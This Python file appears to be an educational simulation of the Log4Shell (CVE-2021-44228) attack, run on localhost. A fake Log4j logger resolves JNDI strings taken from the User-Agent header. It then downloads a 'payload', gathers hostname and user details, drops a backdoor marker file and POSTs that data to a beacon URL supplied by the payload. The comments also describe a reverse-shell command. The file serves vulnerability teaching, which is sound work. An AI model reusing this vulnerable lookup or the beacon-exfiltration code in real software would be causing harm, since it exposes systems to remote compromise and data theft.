"""
Log4Shell Simulation - Vulnerable Application Server
======================================================
This simulates a Java web application that uses a VULNERABLE version
of Apache Log4j 2.x (versions < 2.15.0) for request logging.

The application:
  1. Accepts HTTP requests on port 8080
  2. Logs incoming request headers using a simulated Log4j logger
  3. The vulnerable logger detects ${jndi:ldap://...} patterns
  4. Performs a JNDI/LDAP lookup to the attacker's server
  5. Downloads and "executes" the malicious class

This demonstrates the FULL exploit chain of CVE-2021-44228.

CVE-2021-44228  |  CVSS 10.0 (Critical)
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import socket
import json
import os
import platform
import sys
import time
import urllib.request

# ─── Configuration ───────────────────────────────────────────────────────────
APP_PORT = 8080
BACKDOOR_FILENAME = "LOG4SHELL_BACKDOOR.txt"

# ─── ANSI Colours ────────────────────────────────────────────────────────────
RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
CYAN    = "\033[96m"
MAGENTA = "\033[95m"
BOLD    = "\033[1m"
DIM     = "\033[2m"
RESET   = "\033[0m"
BG_RED  = "\033[41m"
WHITE   = "\033[97m"


# ═══════════════════════════════════════════════════════════════════════════════
#   SIMULATED LOG4J LOGGER (VULNERABLE VERSION 2.14.1)
# ═══════════════════════════════════════════════════════════════════════════════

class VulnerableLog4jLogger:
    """
    Simulates Apache Log4j 2.14.1 (vulnerable).

    In the real vulnerability, Log4j's MessagePatternConverter performs
    recursive string substitution. When it encounters ${jndi:ldap://...},
    it triggers a JNDI (Java Naming and Directory Interface) lookup via
    the InitialContext.lookup() method, which supports LDAP, RMI, DNS,
    and other protocols.

    The LDAP server then returns a JNDI Reference object containing:
      - A class name (e.g., "Exploit")
      - A codebase URL (e.g., "http://attacker.com:8888/")

    The JVM resolves this Reference by downloading the remote .class file
    and instantiating it — executing its static initialiser block, which
    typically contains the attacker's malicious code (reverse shell, etc.)

    This simulator reproduces this exact chain using Python sockets.
    """

    LOG4J_VERSION = "2.14.1"

    def __init__(self):
        self.name = "org.apache.logging.log4j"

    def info(self, message):
        """Log a message — this is where the vulnerability triggers."""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        print(f"  {DIM}[{timestamp}] [INFO] {self.name}: {message}{RESET}")

        # Check for JNDI lookup patterns — the core of the vulnerability
        if "${jndi:" in message:
            self._trigger_jndi_lookup(message)

    def _trigger_jndi_lookup(self, message):
        """
        Simulates Log4j's vulnerable message lookup substitution.

        Real Log4j code path:
          MessagePatternConverter.format()
            → StrSubstitutor.replace()
              → StrSubstitutor.substitute()
                → JndiLookup.lookup()
                  → JndiManager.lookup()
                    → InitialContext.lookup("ldap://attacker/...")
        """
        print(f"\n  {BG_RED}{WHITE}{BOLD} ⚠️  VULNERABILITY TRIGGERED ⚠️  {RESET}")
        print(f"  {RED}Log4j {self.LOG4J_VERSION} detected JNDI lookup pattern!{RESET}")

        # Extract the JNDI URI
        start = message.index("${jndi:") + 7
        end   = message.index("}", start)
        jndi_uri = message[start:end]

        print(f"\n  {CYAN}┌─ JNDI Lookup Resolution ─────────────────────────────{RESET}")
        print(f"  {CYAN}│{RESET}")
        print(f"  {CYAN}│{RESET}  {DIM}Full pattern:{RESET}  ${'{'}jndi:{jndi_uri}{'}'}")
        print(f"  {CYAN}│{RESET}  {DIM}Protocol:{RESET}      {jndi_uri.split('://')[0].upper()}")

        if jndi_uri.startswith("ldap://"):
            ldap_url = jndi_uri[7:]  # strip "ldap://"
            parts = ldap_url.split("/", 1)
            host_port = parts[0]
            resource  = parts[1] if len(parts) > 1 else ""
            host, port = host_port.split(":")
            port = int(port)

            print(f"  {CYAN}│{RESET}  {DIM}LDAP Host:{RESET}     {host}")
            print(f"  {CYAN}│{RESET}  {DIM}LDAP Port:{RESET}     {port}")
            print(f"  {CYAN}│{RESET}  {DIM}Resource:{RESET}      /{resource}")
            print(f"  {CYAN}│{RESET}")
            print(f"  {CYAN}│{RESET}  {YELLOW}[→] Connecting to LDAP server...{RESET}")

            redirect_url = self._ldap_lookup(host, port, resource)

            if redirect_url:
                print(f"  {CYAN}│{RESET}")
                print(f"  {CYAN}│{RESET}  {YELLOW}[→] Downloading remote class from:{RESET}")
                print(f"  {CYAN}│{RESET}      {RED}{BOLD}{redirect_url}{RESET}")

                payload = self._download_exploit_class(redirect_url)

                if payload:
                    print(f"  {CYAN}│{RESET}")
                    print(f"  {CYAN}│{RESET}  {RED}{BOLD}[→] EXECUTING MALICIOUS PAYLOAD...{RESET}")
                    self._execute_payload(payload)

            print(f"  {CYAN}│{RESET}")
            print(f"  {CYAN}└───────────────────────────────────────────────────────{RESET}\n")

    def _ldap_lookup(self, host, port, resource):
        """
        Connect to the attacker's LDAP server and receive the redirect.

        In reality, this performs a full LDAP bind + search operation, and
        the server returns a JNDI Reference with the codebase URL.
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))

            # Send the JNDI resource query
            query = f"JNDI_LOOKUP:/{resource}\n"
            sock.sendall(query.encode("utf-8"))

            # Receive the LDAP referral response
            response = sock.recv(4096).decode("utf-8").strip()
            sock.close()

            if response.startswith("JNDI_REDIRECT:"):
                redirect_url = response.split(":", 1)[1]
                print(f"  {CYAN}│{RESET}  {GREEN}[✓] LDAP response received:{RESET}")
                print(f"  {CYAN}│{RESET}      {DIM}Type: JNDI Reference (javax.naming.Reference){RESET}")
                print(f"  {CYAN}│{RESET}      {DIM}Factory: Exploit{RESET}")
                print(f"  {CYAN}│{RESET}      {DIM}Codebase: {redirect_url}{RESET}")
                return redirect_url
            else:
                print(f"  {CYAN}│{RESET}  {RED}[✗] Unexpected LDAP response{RESET}")
                return None

        except Exception as e:
            print(f"  {CYAN}│{RESET}  {RED}[✗] LDAP connection failed: {e}{RESET}")
            return None

    def _download_exploit_class(self, url):
        """
        Download the malicious Exploit.class from the attacker's HTTP server.

        In reality, the JVM's URLClassLoader fetches the .class file and
        calls Class.forName() → defineClass() → which runs the static
        initialiser block containing the attacker's code.
        """
        try:
            req = urllib.request.Request(url, headers={
                "User-Agent": f"Java/{platform.python_version()}"
            })
            response = urllib.request.urlopen(req, timeout=5)
            data = response.read().decode("utf-8")
            payload = json.loads(data)

            print(f"  {CYAN}│{RESET}  {GREEN}[✓] Exploit.class downloaded ({len(data)} bytes){RESET}")
            print(f"  {CYAN}│{RESET}      {DIM}Class: {payload.get('class', 'Unknown')}{RESET}")
            print(f"  {CYAN}│{RESET}      {DIM}Action: {payload.get('action', 'Unknown')}{RESET}")
            return payload

        except Exception as e:
            print(f"  {CYAN}│{RESET}  {RED}[✗] Failed to download payload: {e}{RESET}")
            return None

    def _execute_payload(self, payload):
        """
        "Execute" the malicious class — simulating what happens when the
        JVM loads and instantiates the attacker's Exploit.class.

        In a real Log4Shell attack, the static initialiser typically runs:
          Runtime.getRuntime().exec("bash -c {reverse_shell_command}")

        Our simulation:
          1. Collects system information (simulating reconnaissance)
          2. Creates a backdoor marker file (proving file-write RCE)
          3. Sends a reverse-shell beacon to the attacker's C2 server
        """
        print(f"  {CYAN}│{RESET}")
        print(f"  {CYAN}│{RESET}  {RED}{'─'*48}{RESET}")
        print(f"  {CYAN}│{RESET}  {RED}{BOLD}  REMOTE CODE EXECUTION IN PROGRESS{RESET}")
        print(f"  {CYAN}│{RESET}  {RED}{'─'*48}{RESET}")

        # Step 1: System reconnaissance
        print(f"  {CYAN}│{RESET}  {MAGENTA}[1/3] Collecting system information...{RESET}")
        system_info = {
            "hostname":     platform.node(),
            "username":     os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
            "platform":     sys.platform,
            "os_release":   platform.release(),
            "architecture": platform.machine(),
            "cwd":          os.getcwd(),
            "python_ver":   platform.python_version(),
            "pid":          str(os.getpid()),
        }

        for key, value in system_info.items():
            print(f"  {CYAN}│{RESET}      {DIM}{key}: {value}{RESET}")

        time.sleep(0.5)

        # Step 2: Drop a backdoor marker file (proves file-write capability)
        print(f"  {CYAN}│{RESET}  {MAGENTA}[2/3] Dropping backdoor marker file...{RESET}")
        backdoor_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), BACKDOOR_FILENAME)
        try:
            with open(backdoor_path, "w") as f:
                f.write("=" * 50 + "\n")
                f.write("  LOG4SHELL BACKDOOR — PROOF OF CONCEPT\n")
                f.write("  CVE-2021-44228  |  CVSS 10.0 (Critical)\n")
                f.write("=" * 50 + "\n\n")
                f.write("This file was created by a simulated Log4Shell\n")
                f.write("exploit payload to demonstrate that the attacker\n")
                f.write("has achieved Remote Code Execution and can write\n")
                f.write("arbitrary files to the victim's filesystem.\n\n")
                f.write("In a real attack, this could be:\n")
                f.write("  - A web shell for persistent access\n")
                f.write("  - A crypto-mining binary\n")
                f.write("  - Ransomware encryption routines\n")
                f.write("  - SSH keys for persistent backdoor access\n\n")
                f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Hostname:  {system_info['hostname']}\n")
                f.write(f"User:      {system_info['username']}\n")
            print(f"  {CYAN}│{RESET}      {GREEN}Written: {backdoor_path}{RESET}")
        except Exception as e:
            print(f"  {CYAN}│{RESET}      {RED}Failed: {e}{RESET}")

        time.sleep(0.5)

        # Step 3: Beacon back to attacker C2
        print(f"  {CYAN}│{RESET}  {MAGENTA}[3/3] Sending beacon to attacker C2 server...{RESET}")
        beacon_url = payload.get("beacon_target", "http://127.0.0.1:8888/beacon")
        try:
            beacon_data = json.dumps(system_info).encode("utf-8")
            req = urllib.request.Request(
                beacon_url,
                data=beacon_data,
                headers={"Content-Type": "application/json"},
                method="POST"
            )
            urllib.request.urlopen(req, timeout=5)
            print(f"  {CYAN}│{RESET}      {RED}{BOLD}Beacon sent! Attacker has full system info.{RESET}")
        except Exception as e:
            print(f"  {CYAN}│{RESET}      {RED}Beacon failed: {e}{RESET}")

        print(f"  {CYAN}│{RESET}  {RED}{'─'*48}{RESET}")
        print(f"  {CYAN}│{RESET}  {RED}{BOLD}  💀 SYSTEM FULLY COMPROMISED{RESET}")
        print(f"  {CYAN}│{RESET}  {RED}{'─'*48}{RESET}")


# ═══════════════════════════════════════════════════════════════════════════════
#   VULNERABLE APPLICATION SERVER
# ═══════════════════════════════════════════════════════════════════════════════

# instantiate the vulnerable logger
log4j = VulnerableLog4jLogger()


class VulnerableAppHandler(BaseHTTPRequestHandler):
    """
    Simulates a Java web application (e.g., Apache Struts, Spring Boot,
    Minecraft server, etc.) that logs HTTP headers using Log4j.

    Many real-world applications log the User-Agent, X-Forwarded-For,
    or other attacker-controllable headers. This is the entry point
    for the Log4Shell exploit.
    """

    def do_GET(self):
        user_agent = self.headers.get("User-Agent", "Unknown")

        print(f"\n{'='*60}")
        print(f"{GREEN}{BOLD}📨 INCOMING HTTP REQUEST{RESET}")
        print(f"{'='*60}")
        print(f"  {DIM}From:{RESET}        {self.client_address[0]}:{self.client_address[1]}")
        print(f"  {DIM}Method:{RESET}      GET {self.path}")
        print(f"  {DIM}User-Agent:{RESET}  {user_agent}")
        print(f"{'='*60}")

        # THIS IS WHERE THE VULNERABILITY IS TRIGGERED
        # The application innocently logs the User-Agent header using Log4j.
        # If the header contains ${jndi:ldap://...}, Log4j will resolve it.
        print(f"\n  {DIM}[LOG4J {VulnerableLog4jLogger.LOG4J_VERSION}] Logging request headers...{RESET}")
        log4j.info(f"Request received from {self.client_address[0]} - User-Agent: {user_agent}")

        # Send normal HTTP response to the attacker
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        response = b"<html><body><h1>Welcome to our application!</h1></body></html>"
        self.wfile.write(response)

    def log_message(self, format, *args):
        """Suppress default HTTP logging."""
        pass


def main():
    print(f"""
{GREEN}{BOLD}╔══════════════════════════════════════════════════════════╗
║       VULNERABLE APPLICATION SERVER                      ║
║       Apache Log4j {VulnerableLog4jLogger.LOG4J_VERSION} (VULNERABLE)                   ║
║       Log4Shell (CVE-2021-44228) Simulation              ║
╚══════════════════════════════════════════════════════════╝{RESET}

{DIM}This simulates a typical Java web application (Spring Boot,
Apache Struts, Minecraft, etc.) that uses a vulnerable version
of Log4j to log HTTP request headers.

When a malicious JNDI lookup string is included in a header
(e.g., User-Agent), Log4j will resolve it — triggering the
full exploit chain: LDAP lookup → class download → RCE.{RESET}
""")

    server = HTTPServer(("127.0.0.1", APP_PORT), VulnerableAppHandler)
    print(f"{GREEN}[*] Application server listening on http://127.0.0.1:{APP_PORT}{RESET}")
    print(f"{RED}[!] WARNING: Running vulnerable Log4j {VulnerableLog4jLogger.LOG4J_VERSION}{RESET}")
    print(f"{YELLOW}[*] Waiting for incoming requests...{RESET}\n")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{DIM}[*] Shutting down application server.{RESET}")


if __name__ == "__main__":
    main()
